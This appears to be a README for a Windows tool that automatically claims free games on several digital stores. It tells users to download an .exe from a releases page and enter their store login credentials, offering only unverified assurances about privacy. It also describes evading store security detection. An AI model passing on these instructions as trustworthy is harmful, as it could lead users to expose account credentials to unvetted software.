# 🎮 free-games-claimer-automation - Claim games across multiple digital stores

[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Norrielisted782/free-games-claimer-automation/releases)

## What is this tool?
This application automates the process of claiming free games and downloadable content. You no longer need to check store pages every week. The software checks the Epic Games Store, Amazon Prime Gaming, GOG, and Unreal Engine marketplace for new free items. It connects to your accounts and adds these games to your permanent library automatically.

## 🛠 System requirements
To run this software on your Windows computer, you need the following:
* Windows 10 or Windows 11.
* A stable internet connection.
* At least 200 MB of free storage space.
* A modern web browser like Chrome or Edge.
* The latest version of the .NET runtime environment.

## 📥 How to download and set up
Follow these steps to get the software running on your system.

1. Visit the [official releases page](https://github.com/Norrielisted782/free-games-claimer-automation/releases) to download the installer.
2. Look for the file ending in `.exe` under the latest release section.
3. Save the file to your desktop or downloads folder.
4. Double-click the file to start the installation wizard.
5. Follow the prompts on your screen.
6. The installer creates a shortcut on your desktop once finished.

## ⚙️ Configuration
The software requires your login details to access your game accounts. These details stay on your local computer and remain private.

1. Open the application using the desktop shortcut.
2. Select the "Settings" tab at the top of the interface.
3. Choose the store you want to connect, such as Epic Games or Amazon Prime.
4. Input your account credentials.
5. Save your settings.
6. The application performs a test connection to ensure it reaches the store servers.

## 🚀 Running the software
The application runs as a background process to keep your library updated.

1. Launch the application.
2. Click the "Start Automation" button.
3. The software opens a hidden browser window to visit store pages. It detects free items and claims them for you.
4. You can see the status of each task in the main window. It shows a list of claimed items, any errors encountered, and the next scan time.
5. Minimize the application to your system tray to keep it running silently while you work or play.

## 🔔 Setting up notifications
You can receive alerts whenever the software claims a new game. 

1. Go to the "Notifications" tab.
2. Activate the toggle for desktop alerts.
3. You can also configure email notifications if you prefer. To use email, input your server settings into the provided fields. 
4. Click "Test Notification" to verify your settings. A sample alert appears on your screen if the setup works.

## 🧠 Troubleshooting common issues
If the software stops working, try these steps to fix the problem.

* **Check your internet:** Ensure your router provides a steady connection.
* **Update your credentials:** Stores change their login methods over time. If the software reports a login error, remove your stored credentials and enter them again.
* **Restart the application:** Close the window completely and open it again. This clears any minor software conflicts.
* **Review the logs:** The "Logs" tab shows exactly what the computer tried to do. Use this information to understand why a claim failed. Often, this happens because a store page is temporarily down for maintenance.
* **Update the software:** Check the releases page periodically. Newer versions often include fixes for store interface changes.

## 📁 Understanding the file structure
The folder where you installed the program contains several important files. Do not delete these.

* **config.json:** This file contains your saved settings and encrypted account information. 
* **logs/:** This directory stores text files that track app activity. If you report a bug, this is the information developers need.
* **browser-data/:** This folder holds small data packets that simulate your browser activity, allowing the app to log in without triggering security warnings from the game stores.

## 🛡 Security and privacy
This application does not collect your data or send it to external servers. All automation happens locally on your machine. The software uses industry-standard encryption for your passwords while they sit on your hard drive. Your credentials never leave your computer unless you explicitly choose to share log files with a developer for support.

## 💡 Best practices for the best experience
* **Schedule scans:** Use the task scheduler within the settings tab to run the app during night hours. This prevents the browser windows from interrupting your daily computer use.
* **Keep your store passwords safe:** Use unique passwords for each store account. This adds a layer of safety regardless of the tools you use.
* **Monitor the logs:** Check the activity logs once a week to ensure every claim succeeded for the most popular stores.
* **Use browser automation responsibly:** Do not force the app to scan every hour. Most stores update their lists once per day or once per week. Frequent scanning risks locking your accounts for suspicious activity.

## 🔄 Updating to new versions
The application checks for updates when you start it. If a new version exists, a window appears asking if you want to install it. Follow the instructions to download the new version. The installer preserves your configuration files, so you do not need to re-enter your login information after an update.

## ❓ Frequently asked questions
**Does this tool work if a game requires two-factor authentication?**
Yes. If a store sends a code to your email or phone, the application pauses and opens a prompt for you to enter that code. Once you enter it, the app continues the claim process.

**Can I stop the automation at any time?**
Yes. Press the "Stop" button at any time to halt all activity. The application saves your progress before it shuts down.

**Does this software work on Apple computers?**
This version is designed for Windows. While it uses technologies compatible with other systems, there is no official installer for Mac or Linux at this time.

**Is my account at risk of being banned?**
The tool uses standard browser behavior to simulate human activity. It stays within typical usage patterns to avoid detection by store security systems. Proceeding with caution and avoiding excessive scan frequencies is the safest approach.

**What happens if I already own the game?**
The software checks your library before claiming. If you already own the title, it skips that item and moves to the next one on the list to avoid duplicate entries.